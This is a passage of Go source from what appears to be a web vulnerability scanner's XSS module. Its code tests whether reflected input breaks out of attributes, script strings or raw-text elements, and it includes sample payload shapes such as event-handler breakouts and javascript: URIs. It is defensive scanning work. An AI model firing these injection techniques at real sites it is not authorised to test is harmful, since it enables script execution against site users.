		Remediation: "Validate the scheme of any URL built from request data and allow only http and https. " +
			"Never place request data in an href or src without a scheme check.",
	})
	return []Finding{finding}
}

// attributeEscapes handles a value that landed inside a tag.
func attributeEscapes(ctx context.Context, t *Transport, p Point, baseline *Response,
	body, canary, attrName string, filter xsseFilter) []Finding {
	// A navigable attribute is checked first: it is one request, it has a
	// fingerprint no other family has, and on a page with a search link in a
	// result row it is the finding an operator actually wants.
	if xsseURIAttributes[attrName] {
		payload := xsseLinkPayload(canary)
		if !filter.allowsString(payload) {
			return nil
		}
		resp, err := t.Fire(ctx, p, p.Param, payload, false, nil)
		if err == nil && Fresh(baseline, resp, payload) && javascriptURIAssigns(resp.Body, payload) {
			finding, _ := NewFinding(Spec{
				Module:   "xss-escape",
				Title:    "javascript: URI injected into " + attrName,
				Claimed:  SeverityHigh,
				Tier:     TierVerified,
				Point:    p,
				Payload:  payload,
				Evidence: Snippet(resp.Body, payload, xssTagWindow),
				Description: "The parameter is written into the " + attrName + " attribute without encoding, and " +
					"the application rendered it as a javascript: URI. Following the link executes the submitted " +
					"script in the application's own origin.",
				Remediation: "Allow only http and https in URLs built from request data, and encode the value " +
					"for an attribute context.",
			})
			return []Finding{finding}
		}
	}
	for _, candidate := range xsseAttributeEscapes {
		if ctx.Err() != nil {
			return nil
		}
		if !filter.allowsString(candidate.payload) {
			continue
		}
		resp, err := t.Fire(ctx, p, p.Param, candidate.payload, false, nil)
		if err != nil || !Fresh(baseline, resp, candidate.payload) {
			continue
		}
		// Not `confirmExecutable`: that rule asks whether the application built a
		// *new* element from the payload, and an attribute breakout never builds
		// one — it hands an event handler to a tag the page had already written.
		// Asking the element rule here reports a high finding on a page that
		// merely echoes the string inside its own markup.
		if !confirmHandlerInjectedIntoTag(resp.Body, candidate.payload) {
			continue
		}
		finding, _ := NewFinding(Spec{
			Module:   "xss-escape",
			Title:    "Context escape (attribute value, " + candidate.name + ", executable markup confirmed)",
			Claimed:  SeverityHigh,
			Tier:     TierVerified,
			Point:    p,
			Payload:  candidate.payload,
			Evidence: Snippet(resp.Body, candidate.payload, xssTagWindow),
			Description: "The parameter value is written into an attribute without encoding. A payload that ends " +
				"the attribute value and adds an event handler to the same tag produced an element the " +
				"application's own response carries, so the handler executes without any interaction.",
			Remediation: "Encode output for an attribute context, or build attributes without string " +
				"concatenation. Deploy a Content-Security-Policy without 'unsafe-inline' as a second control.",
		})
		return []Finding{finding}
	}
	return nil
}

// confirmInjectedElement reports whether the payload is now markup a browser
// would build and run.
//
// The three exclusions are the ones that turn an echo into a non-event, and
// each of them has cost a scanner a false positive:
//
//   - inside a tag: the payload is then an attribute value, and `<svg onload=…>`
//     written into `href="…"` is a string, not an element;
//   - inside a comment: the parser reads a comment as characters;
//   - inside a raw-text element (`xmp`, `noembed`, `noframes`, `style`, and
//     `plaintext`, which never closes): the parser reads their content as text
//     too, so the same markup is inert there.
//
// The element has to be *in the payload*. A chain payload — close the RCDATA
// element, then write the tag — cannot satisfy the existing rule that requires
// the payload to begin inside a tag it built, and that rule is right for the
// plain shapes and wrong for this one. Freshness against the unmodified page is
// what keeps this from borrowing the site's own markup: the payload was not
// there before the injection, so the element came from it.
func confirmInjectedElement(body, payload string) bool {
	body = stripComments(body)
	index := strings.Index(body, payload)
	if index < 0 {
		return false
	}
	if insideOpenTag(body, index) {
		return false
	}
	if insideRawTextElement(body, index, payload) {
		return false
	}
	return xssExecutableTag.MatchString(payload)
}

// rawTextElements are the elements whose content a parser reads as characters.
var rawTextElements = []string{"xmp", "noembed", "noframes", "style", "plaintext", "textarea", "title"}

// xsseClosingTag builds the close tag a chain payload uses to leave a raw-text
// element.
func xsseClosingTag(name string) string { return "</" + name }

// insideRawTextElement reports whether body[index] lies inside an element whose
// content the HTML parser treats as text — and whether the payload leaves it.
//
// The second half is the whole reason this takes the payload. A value inside
// `<textarea>` is inert, and XSSTRON's answer is a payload whose first bytes are
// `</textarea>`: the position *is* raw text, and the payload closes the element
// before writing its tag. Refusing every raw-text position would refuse the
// exact escape the payload was written for, and accepting every one would
// report a page that escaped the value.
//
// `plaintext` has no closing tag at all, so nothing can leave it.
func insideRawTextElement(body string, index int, payload string) bool {
	if index <= 0 || index > len(body) {
		return false
	}
	prefix := strings.ToLower(body[:index])
	lowerPayload := strings.ToLower(payload)
	for _, name := range rawTextElements {
		open := strings.LastIndex(prefix, "<"+name)
		closing := strings.LastIndex(prefix, xsseClosingTag(name))
		if open < 0 || open < closing {
			continue
		}
		if name == "plaintext" {
			return true
		}
		if strings.Contains(lowerPayload, xsseClosingTag(name)) {
			return false
		}
		return true
	}
	return false
}

// confirmHandlerInjectedIntoTag reports whether the payload ended an attribute
// value and left an event handler on the tag the page had already written.
//
// It asks about the *enclosing* tag rather than about a new element, because
// that is what an attribute breakout produces: `<a href=VALUE class="c">` with
// the value replaced becomes `<a href=x id=clx onclick=proof// class="c">`. The
// page never built an element from the input — it already had one — so the
// element rule in `confirmExecutable` cannot see this at all.
//
// The handler name is read out of the payload rather than matched as "any `on*=`",
// because a page may legitimately carry its own handler on the same tag. Naming
// the one the payload carries ties the evidence to the submitted input.
func confirmHandlerInjectedIntoTag(body, payload string) bool {
	body = stripComments(body)
	index := strings.Index(body, payload)
	if index < 0 {
		return false
	}
	open := strings.LastIndex(body[:index], "<")
	if open < 0 || strings.Contains(body[open:index], ">") {
		return false
	}
	tail := strings.Index(body[index:], ">")
	if tail < 0 {
		return false
	}
	handler := eventHandlerName(payload)
	if handler == "" {
		return false
	}
	tag := strings.ToLower(body[open : index+tail])
	return strings.Contains(tag, handler+"=")
}

// xsseHandlerAttr matches the event-handler attribute a payload introduces.
//
// The attribute *name* is what matters, not the value: the name is the token the
// page had to accept for the handler to exist at all, and reading the value
// instead would compare a `document.title=…` expression against a tag that
// contains a different one.
var xsseHandlerAttr = regexp.MustCompile(`(?i)\b(on[a-z]{3,})\s*=`)

// eventHandlerName returns the event-handler attribute a payload introduces,
// lower-cased and without the `=`, or "".
func eventHandlerName(payload string) string {
	match := xsseHandlerAttr.FindStringSubmatch(payload)
	if match == nil {
		return ""
	}
	return strings.ToLower(match[1])
}

// jsStringDelimiter names the quote character that delimits the string the
// value landed in.
//
// It reads the characters immediately around the canary rather than searching
// for quotes, because a script block on a real page has quotes in it already:
// `var api = "https://…"; var q = 'CANARY'` must resolve to `'`, and a search
// for the nearest quote would return `"`.
func jsStringDelimiter(body, canary string) string {
	index := strings.Index(body, canary)
	if index < 0 {
		return ""
	}
	before, after := byte(0), byte(0)
	if index > 0 {
		before = body[index-1]
	}
	if index+len(canary) < len(body) {
		after = body[index+len(canary)]
	}
	for _, quote := range []byte{'\'', '"', '`'} {
		if before == quote && after == quote {
			return string(quote)
		}
	}
	for _, quote := range []byte{'\'', '"', '`'} {
		if before == quote || after == quote {
			return string(quote)
		}
	}
	return ""
}

// confirmScriptBreak reports whether the payload landed raw inside a script
// element a browser executes.
// confirmScriptBreak reports whether the payload left the JavaScript construct it
// was written into, and the construct is the question that matters: a value that
// stayed inside a string, a comment or a regex comes back verbatim in every case,
// so finding the payload proves nothing by itself.
func confirmScriptBreak(body, payload string) bool {
	body = stripComments(body)
	index := strings.Index(body, payload)
	if index < 0 {
		return false
	}
	// A quote the application escaped does not close anything. The response carries
	// `\"` where the payload sent `"`, so the substring search finds the payload
	// inside the escaped form and the row would claim a break that never happened —
	// which is why the escaped-quote shape exists and why it has to be reached by
	// its own entry rather than by the plain closer passing in its place.
	if !unescapedCloser(body, index, payload) {
		return false
	}
	_, _, attrs, inside := scriptElementAt(body, index)
	return inside && scriptIsExecutable(attrs)
}

// unescapedCloser reports whether the payload's own closing character arrived
// unescaped.
//
// An odd number of backslashes immediately before it means the application added
// the last one and the character is literal text; an even number — including none —
// means the parser reads it as written.
func unescapedCloser(body string, index int, payload string) bool {
	first := payload[0]
	if first != '\'' && first != '"' && first != '`' {
		return true
	}
	backslashes := 0
	for i := index - 1; i >= 0 && body[i] == '\\'; i-- {
		backslashes++
	}
	return backslashes%2 == 0
}

// scriptElementAt returns the attributes of the script element whose content
// contains body[index], and whether there is one.
//
// `>` and `<` are searched in the prefix only, because the payload sits inside
// the element: the element's closing `>` is after the payload, in the suffix,
// and a search that included the suffix would find it and report "not inside".
func scriptElementAt(body string, index int) (start, end int, attrs string, ok bool) {
	if index <= 0 || index > len(body) {
		return 0, 0, "", false
	}
	prefix := strings.ToLower(body[:index])
	open := strings.LastIndex(prefix, "<script")
	closing := strings.LastIndex(prefix, "</script")
	if open < 0 || open < closing {
		return 0, 0, "", false
	}
	tail := strings.Index(body[open:index], ">")
	if tail < 0 {
		return 0, 0, "", false
	}
	return open, index, body[open+len("<script") : open+tail], true
}

// scriptIsExecutable reports whether a script element's attributes mark its
// content as data rather than code.
func scriptIsExecutable(attrs string) bool {
	lower := strings.ToLower(attrs)
	for _, marker := range nonExecutableScriptTypes {
		if strings.Contains(lower, marker) {
			return false
		}
	}
	return true
}

// javascriptURIAssigns reports whether the payload sits where a navigable
// attribute's value begins, and begins with a `javascript:` scheme.
//
// The gap rule is what makes it a statement about the page rather than about
// the text that was sent: between the assignment the page wrote and the payload
// that came back, the page may have added nothing at all. A reflected string
// that merely contains `href="javascript:` inside a longer value — or a URL
// like `href="/go?q=javascript:…"` — fails it, and both refusals are correct:
// the first builds no navigation primitive, the second is a relative URL.
func javascriptURIAssigns(body, payload string) bool {
	if !strings.HasPrefix(strings.ToLower(payload), "javascript:") {
		return false
	}
	document := stripComments(body)
	index := strings.Index(document, payload)
	if index < 0 {
		return false
	}
	// The assignment has to be an attribute of a tag, not text that happens to
	// quote one. A paragraph documenting `href="javascript:…"` is the case the
	// gap rule alone cannot see, because the gap really is empty.
	if !insideOpenTag(document, index) {
		return false
	}
	low := index - 200
	if low < 0 {
		low = 0
	}
	window := document[low:index]
	matches := xsseJavascriptAssign.FindAllStringIndex(window, -1)
	if len(matches) == 0 {
		return false
	}
	gap := window[matches[len(matches)-1][1]:]
	return strings.Trim(gap, " \t\n\r\f") == ""
}

// attributeAt reports the tag name and attribute name whose value contains
// body[index], and whether the position is inside a tag at all.
//
// The last `=` before the reflection is the attribute's own: the reflection is
// inside the value, so the tag's closing `>` is after it and must not be
// consulted.
func attributeAt(body string, index int) (tag, attr string, quoted, ok bool) {
	if index <= 0 || index > len(body) {
		return "", "", false, false
	}
	prefix := body[:index]
	tagStart := strings.LastIndex(prefix, "<")
	if tagStart < 0 {
		return "", "", false, false
	}
	rest := prefix[tagStart+1:]
	name := 0
	for name < len(rest) && isTagNameByte(rest[name]) {
		name++
	}
	if name == 0 {
		return "", "", false, false
	}
	tag = strings.ToLower(rest[:name])
	trailing := strings.TrimRight(rest[name:], " \t\n\r\f")
	if len(trailing) > 0 {
		if last := trailing[len(trailing)-1]; last == '"' || last == '\'' {
			quoted = true
			trailing = trailing[:len(trailing)-1]
		}
	}
	equals := strings.LastIndex(trailing, "=")
	if equals < 0 {
		return tag, "", quoted, false
	}
	attribute := strings.TrimSpace(trailing[:equals])
	if attribute == "" || strings.ContainsAny(attribute, " \t\n\r\f\"'=<>`") {
		return tag, "", quoted, false
	}
	return tag, strings.ToLower(attribute), quoted, true
}

// isTagNameByte reports whether a byte can appear in an element or attribute
// name. The list is HTML's, not Go identifier syntax: a colon is a namespace
// separator (`xlink:href`) and a hyphen is ordinary (`data-role`).
func isTagNameByte(b byte) bool {
	switch {
	case b >= 'a' && b <= 'z', b >= 'A' && b <= 'Z', b >= '0' && b <= '9':
		return true
	case b == '-' || b == ':' || b == '_':
		return true
	}
	return false
}
